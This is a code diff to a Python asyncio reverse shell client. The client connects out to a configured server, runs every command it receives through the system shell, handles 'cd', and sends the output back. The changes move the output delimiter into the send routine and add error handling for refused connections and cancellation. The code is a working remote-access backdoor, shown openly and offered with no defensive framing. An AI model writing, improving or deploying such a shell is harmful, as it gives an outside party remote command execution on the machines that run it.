@@ -1,5 +1,6 @@
 import asyncio
 import os
+from asyncio import CancelledError
 from pathlib import Path
 
 # Configuration: Server address and port for the reverse shell connection
@@ -22,7 +23,7 @@ class ReverseShellClient:
         """
         Sends command output back to the server.
         """
-        self.writer.write(data)
+        self.writer.write(data + b"__END__")
         await self.writer.drain()
 
     def resolve_path(self, path: str) -> str:
@@ -39,52 +40,59 @@ class ReverseShellClient:
         """
         Connects to the reverse shell server and listens for commands to execute.
         """
-        self.reader, self.writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)
-        print(f"[+] Connected to reverse shell server at {SERVER_HOST}:{SERVER_PORT}")
+        try:
+            self.reader, self.writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)
+            print(f"[+] Connected to reverse shell server at {SERVER_HOST}:{SERVER_PORT}")
 
-        while True:
-                # Receive a command from the server
-            data = await self.reader.read(1024)
-            if not data:
-                print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
-                self.writer.close()
-                await self.writer.wait_closed()
-                break
+            while True:
+                    # Receive a command from the server
+                data = await self.reader.read(1024)
+                if not data:
+                    print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
+                    self.writer.close()
+                    await self.writer.wait_closed()
+                    break
 
-            command = data.decode().strip()
-            try:
-                # Handle change directory (cd) command
-                if command.startswith("cd ") or command == "cd":
-                    print('[-] Changing directory. Before:', Path.cwd())
-                    os.chdir(self.resolve_path(command[3:]))
-                    self.current_directory = os.getcwd()
-                    response = f"[+] Changed directory to: {self.current_directory}\n"
-                    print('[+] After:', Path.cwd())
-                    await self.send_output(response.encode() + b"__END__")
-                    continue
+                command = data.decode().strip()
+                try:
+                    # Handle change directory (cd) command
+                    if command.startswith("cd ") or command == "cd":
+                        print('[-] Changing directory. Before:', Path.cwd())
+                        os.chdir(self.resolve_path(command[3:]))
+                        self.current_directory = os.getcwd()
+                        response = f"[+] Changed directory to: {self.current_directory}\n"
+                        print('[+] After:', Path.cwd())
+                        await self.send_output(response.encode() )
+                        continue
 
-                print(f"[>] Executing command: {command} (Current directory: {Path.cwd()})")
+                    print(f"[>] Executing command: {command} (Current directory: {Path.cwd()})")
 
-                # Execute shell command asynchronously
-                process = await asyncio.create_subprocess_shell(
-                    command,
-                    stdin=asyncio.subprocess.PIPE,
-                    stdout=asyncio.subprocess.PIPE,
-                    stderr=asyncio.subprocess.STDOUT,
-                    cwd=Path.cwd()
-                )
+                    # Execute shell command asynchronously
+                    process = await asyncio.create_subprocess_shell(
+                        command,
+                        stdin=asyncio.subprocess.PIPE,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.STDOUT,
+                        cwd=Path.cwd()
+                    )
 
-                output, _ = await process.communicate()
+                    output, _ = await process.communicate()
 
-                # Send the output back to the server
-                await self.send_output(output + b"__END__")
+                    # Send the output back to the server
+                    await self.send_output(output )
 
-            except FileNotFoundError:
-                await self.send_output(f"[-] No such file or directory: {command}\n".encode() + b"__END__")
-            except NotADirectoryError:
-                await self.send_output(f"[-] Not a directory: {command}\n".encode() + b"__END__")
-            except PermissionError:
-                await self.send_output(f"[-] Permission denied: {command}\n".encode() + b"__END__")
+                except FileNotFoundError:
+                    await self.send_output(f"[-] No such file or directory: {command}\n".encode())
+                except NotADirectoryError:
+                    await self.send_output(f"[-] Not a directory: {command}\n".encode())
+                except PermissionError:
+                    await self.send_output(f"[-] Permission denied: {command}\n".encode())
+        except CancelledError:
+            print("[-] Interrupted by user. Closing connection.")
+            # do something
+        except ConnectionRefusedError as e:
+            print(f"[-] Connect call failed please verify the server ip and port and try again")
+            # do something
 
 
 async def main():
